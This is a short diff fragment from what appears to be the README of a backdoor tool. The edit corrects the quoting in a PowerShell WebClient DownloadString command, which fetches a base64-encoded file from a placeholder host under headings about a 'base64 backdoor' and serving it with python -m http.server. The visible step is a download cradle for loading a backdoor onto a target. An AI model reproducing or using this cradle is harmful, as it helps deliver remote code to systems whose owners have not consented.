@@ -28,7 +28,7 @@ python -m http.server
 ## Download String base64 backdoor
 Download String From Your Server Python
 ``` powershell
-(New-Object System.Net.WebClient).DownloadString(http://example.com/file-encode.txt)
+(New-Object System.Net.WebClient).DownloadString("http://example.com/file-encode.txt")
 ```
 ## Ddecode Base64
 
